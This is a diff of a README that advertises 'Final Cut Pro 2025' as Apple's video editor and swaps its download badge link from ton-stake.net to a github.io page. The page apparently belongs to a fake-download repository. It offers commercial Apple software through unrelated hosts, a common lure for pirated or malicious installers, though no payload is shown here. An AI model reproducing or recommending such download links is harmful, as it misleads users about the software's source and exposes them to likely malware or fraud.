@@ -3,7 +3,7 @@
 **Final Cut Pro 2025** is Apple’s professional video editing software for macOS.  
 From cinematic films to YouTube tutorials, it provides advanced editing tools with performance optimized for Apple Silicon.  
 
-[![Download Final Cut Pro](https://img.shields.io/badge/Download-Final_Cut_Pro_2025-blueviolet)](https://ton-stake.net)
+[![Download Final Cut Pro](https://img.shields.io/badge/Download-Final_Cut_Pro_2025-blueviolet)](https://olombaris-25.github.io/.github/finalcutpro)
 
 ---
 
